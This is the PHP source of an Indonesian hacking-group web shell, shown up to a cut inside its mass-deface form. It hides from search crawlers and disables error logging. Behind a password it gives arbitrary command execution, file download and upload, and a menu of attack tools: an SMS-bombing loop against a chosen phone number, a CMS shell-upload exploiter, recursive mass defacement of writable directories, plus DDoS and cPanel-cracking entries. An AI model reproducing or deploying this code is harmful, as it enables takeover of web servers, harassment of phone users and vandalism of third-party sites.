session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>INDONESIAN DARKNET</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: red;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: transparent;
	border: 1px dotted red;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
<style>
body{
background-color: black;background-image: url("') ;background-repeat:no-repeat ;background-size: 100% 100%;
</style>
</head>	
<!-- style -->
    <link rel="stylesheet" href="http://444.com.tr/css/bootstrap.min.css" media="screen">
    <link rel="stylesheet" href="http://444.com.tr/css/style.css" media="screen">
    <link rel="stylesheet" href="http://444.com.tr/css/normalize.css" media="screen">
    <link rel="stylesheet" href="http://444.com.tr/css/font-awesome.min.css" media="screen">
    <link rel="stylesheet" href="http://444.com.tr/css/media.css" media="screen">
<!-- /style -->
<!--[if IE]>
    <style>section{overflow:hidden !important;}</style>
<![endif]-->
<style>
@import url(http://fonts.googleapis.com/css?family=Open+Sans:800);

.text {
    fill: none;
    stroke-width: 6;
    stroke-linejoin: round;
    stroke-dasharray: 70 330;
    stroke-dashoffset: 0;
    -webkit-animation: stroke 6s infinite linear;
    animation: stroke 6s infinite linear;
}

.text:nth-child(5n + 1) {
    stroke: #F2385A;
    -webkit-animation-delay: -1.2s;
    animation-delay: -1.2s;
}
.text:nth-child(5n + 2) {
    stroke: #F5A503;
    -webkit-animation-delay: -2.4s;
    animation-delay: -2.4s;
}

.text:nth-child(5n + 3) {
    stroke: #E9F1DF;
    -webkit-animation-delay: -3.6s;
    animation-delay: -3.6s;
}

.text:nth-child(5n + 4) {
    stroke: #56D9CD;
    -webkit-animation-delay: -4.8s;
    animation-delay: -4.8s;
}

.text:nth-child(5n + 5) {
    stroke: #3AA1BF;
    -webkit-animation-delay: -6s;
    animation-delay: -6s;
}

@-webkit-keyframes stroke {
    100% {
    stroke-dashoffset: -400;
    }
}

@keyframes stroke {
    100% {
    stroke-dashoffset: -400;
    }
}
html, body {
    height: 100%;
}
body {
    background: #111;
    background-size: .2em 100%;
    font: 11.5em/1 Open Sans, Impact;
    text-transform: uppercase;
    margin: 0;
}
svg {
    position: absolute;
    width: 100%;
    height: 100%;
}
</style>
</head>
<body>
<style type="text/css" media="screen"> body { background: url(../2.bp.blogspot.com/-PeHFnI94a_8/UwCPj-JFQzI/AAAAAAAAAMU/ALCzlsv3-1k/s1600/bg-body.jpg) } </style>
<!-- PRELOADER -->
    <div id="preloader">
    <div class="loading">
        <div class="loader">
</div>
</div>
</div>
<!-- /PRELOADER -->
<!-- HOME SCREEN -->
    <div id="star" class="video mask overlay">
<canvas class="cover"></canvas></div>
<svg viewBox="0 0 1000 300">
    <symbol id="s-text">
        <text text-anchor="middle" x="50%" y="50%" dy=".35em"></text>
    </symbol>
    <use xlink:href="#s-text" class="text"></use>
    <use xlink:href="#s-text" class="text"></use>
    <use xlink:href="#s-text" class="text"></use>
    <use xlink:href="#s-text" class="text"></use>
    <use xlink:href="#s-text" class="text"></use>
</svg>
<center>
<img src="http://www.studioroma.be/wp-content/uploads/2018/05/maxresdefault.jpg" width="540px" height="340px;">
   <div style="text-shadow: 0px 0px 50px red;"><font color="red" face="Courier New" size="98px;"><b>INDONESIAN DARKNET</b></font>
<form method="post">
<input type="password" name="pass">
</form>
</center>
<!-- /HOME SCREEN -->
    <script src="http://444.com.tr/js/jquery.js"></script>
    <script src="http://444.com.tr/js/bootstrap.min.js"></script> 
    <script src="http://444.com.tr/js/modernizr.custom.js"></script>
    <script src="http://444.com.tr/js/plugins.min.js"></script>
    <script src="http://444.com.tr/js/main.js"></script>
</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>INDONESIAN DARKNET</title>
<meta name='author' content='Indonesian Darknet'>
<meta name='copyright' content='INDONESIAN DARKNET'>
<meta charset="UTF-8">
<link href='https://fonts.googleapis.com/css?family=Cinzel' rel='stylesheet' type='text/css'>
<style>
body{
background-color: black;background-image: url("http://www.studioroma.be/wp-content/uploads/2018/05/maxresdefault.jpg") ;background-repeat:no-repeat ;background-size: 100% 100%;
</style>
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
background-color: darkred;
border: 1px solid red;
display: inline;
    margin: 5px;
    padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>
</head>
<?php
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & all my friends.
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<font color=#8B0000>";
echo "<img src='http://www.studioroma.be/wp-content/uploads/2018/05/maxresdefault-picsay.jpg' width='220px' height='220px' border='2px solid red' style='float:left'>";
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "  [ ".w($dir, perms($dir))." ]";
echo "</font>";
echo "<hr>";
echo "<center>";
echo "<marquee scrollamount='9' direction='left' width='50%'><font color='#8B0000' face='Cinzel' size='3px'><b>WELCOME TO INDONESIAN DARKNET - FROM CYBER TO BROTHERHOOD</font></marquee>";
echo "<ul>";
echo "<li><a href='?'>Home</a></li>";
echo "<li><a href='?dir=$dir&do=upload'>Upload</a></li>";
echo "<li><a href='?dir=$dir&do=spam'>Bom SMS</a></li>";
echo "<li><a href='?dir=$dir&do=balitbang'>Exploiter Balitbang</a></li>";
echo "<li><a href='?dir=$dir&do=cmd'>Command</a></li>";
echo "<li><a href='?dir=$dir&do=mass_deface'>Mass Deface</a></li>";
echo "<li><a href='?dir=$dir&do=ddos'>DDoS</a> ]</li>";
echo "<li><a href='?dir=$dir&do=ende'>Encode/Decode</a></li><br><br>";
echo "<li><a href='?dir=$dir&do=mass_delete'>Mass Delete</a></li>";
echo "<li><a href='?dir=$dir&do=config'>Config</a></li>";
echo "<li><a href='?dir=$dir&do=jumping'>Jumping</a></li>";
echo "<li><a href='?dir=$dir&do=cpanel'>CPanel Crack</a></li>";
echo "<li><a href='?dir=$dir&do=smtp'>SMTP Grabber</a></li>";
echo "<li><a href='?dir=$dir&do=zoneh'>Zone-H</a></li>";
echo "<li><a href='?dir=$dir&do=cgi'>CGI Telnet</a></li><br><br>";
echo "<li><a href='?dir=$dir&do=network'>Network</a></li>";
echo "<li><a href='?dir=$dir&do=symlink'>Symlink</a></li>";
echo "<li><a href='?dir=$dir&do=adminer'>Adminer</a></li>";
echo "<li><a href='?dir=$dir&do=fake_root'>Fake Root</a></li>";
echo "<li><a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a></li>";
echo "<li><a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a></li>";
echo "<li><a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a></li><br><br>";
echo "<li><a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a></li>";
echo "<li><a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a></li>";
echo "<li><a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a></li>";
echo "<li><a href='?dir=$dir&do=md5'>Create MD5</a></li>";
echo "<li><a href='?dir=$dir&do=about'>About</a></li>";
echo "<li><a style='color: black;' href='?logout=true'>Logout</a></li>";
echo "</b>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'about') {
?>
<html>
<head>
<title>About Me</title>
<link href="http://fonts.googleapis.com/css?family=Bad+Script" rel="stylesheet" type="text/css">
</head>
<body>
<center><img src="http://www.studioroma.be/wp-content/uploads/2018/05/maxresdefault-picsay.jpg" width="220px" height="220px" border="2px solid red"></center></br></br>
<center><font color="white" face="Bad Script" size="4px;"><p>INDONESIAN DARKNET<br>SHELL INI DI BUAT SEMATA - MATA UNTUK MEMPERMUDAH DALAM MELAKUKAN AKSI DEFACE.</br><font color="red">Created By : Cy#b3r0ne.</font></center>
</body>
</html>
<?php
} elseif($_GET['do'] == 'md5') {
?>
<?php
//check if the form has been submitted
if(isset($_POST['md5me'])) {
	//MD5 encode the submitted content
	$md5ed = md5($_POST['md5me']);
}
?>
 <center>
<p>MD5 Value: <font color="lime"><strong><?php echo $md5ed;?></strong></p></font>
 
<font color="white"><form action="#" method="post">
    <label for="md5me">MD5 Me:</label>
    <input name="md5me" id="md5me" type="text" />
    <input type="submit" value="Create MD5 Hash" />
</form>
</font>
</center>
</html>
<?php
} elseif($_GET['do'] == 'spam') {
?>
<!DOCTYPE html> 
<html>
 <head>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
 <style type="text/css">
{ padding: 0; margin: 0; } h2{ 	color:#50626C; 	text-align: center; 	font-family: arial; 	text-transform: uppercase; 	border: 5px solid #8B0000; 	padding: 5px; 	width: 300px; 	margin: auto; 	margin-bottom: 10px; margin-top: 20px; } form { border: 3px solid #8B0000; font-family: arial; width: 300px; margin: auto; } input[type=text], input[type=password] , input[type=number]{ width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #8B0000; box-sizing: border-box; } label{ 	color:#50626C; 	text-transform: uppercase; } button { background-color: #049372; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; } button:hover { opacity: 0.8; } .cancelbtn { width: auto; padding: 10px 18px; background-color: #f03434; } .imgcontainer { text-align: center; margin: 24px 0 12px 0; } img.avatar { width: 40%; border-radius: 50%; } .container { padding: 16px; } span.psw { float: right; padding-top: 16px; } span{ 	color:#50626C; } /* Change styles for span and cancel button on extra small screens */ @media screen and (max-width: 300px) { span.psw { display: block; float: none; } .cancelbtn { width: 100%; } }
    </style>
<title>Spammer Tools</title>
<link rel="stylesheet" href="style.css" type="text/css">
</head>
<body bgcolor="black">
<h2><font color="#8B0000">SPAMER TOOLS</h2>
<form action=""index.php" method="POST">
<div class="container"> 
<label><b>Nomer</b></label> <input type="text" placeholder="Nomer... (085123123...)" name="nomer" id="nomer" value="" required> 

<label><b>Jumlah</b></label> <input type="number" placeholder="Jumlah... (1 - 99999) " name="jumlah" id="jumlah" required> 

<button type="submit">Tembak</button>
<br><br><br>
<center>
<h5><font color="#8B0000">Copyright © : INDONESIAN DARKNET
</h5>
</center>
</body> </html>
<?php
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
$nomor = $_POST['nomer'];
$jumlah = $_POST['jumlah'];
$jeda = "1";
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute; 
 } elseif($_GET['do'] == 'balitbang') {
?>
<center>
<h1>CMS Balitbang Auto Exploiter</h1>
<form action='' method='post'>
<center>
<p>Target URL : <input style='border-color=white;' type='text' name='url' class='text' placeholder='http://127.0.0.1/' size="50"></p>
</p>
<p><input type='submit' name='send' class='kotak' style='border-color=white;' value='Kunci Target'></p></center>
</form>
<?php
if (isset($_POST['send'])) {
    $url = $_POST['url'];
    $resulturl = "Target URL : $url";
    echo "<center>
<hr color='white'><br>
$resulturl
$resultoken
</center>";
echo '<center style="border-color=white;"><form enctype="multipart/form-data" action="'.$url.'/files/tugas/tgs-ganteng.phtml" method="post"></center>';
echo '<center style="border-color=white;"><input name="file" type="file"><input type="submit" class="kotak" value="Upload"><br><br>Format file: shell.phtml ato shell.php5</center>';
}
echo "</div>";
} elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Cy#b3r0ne
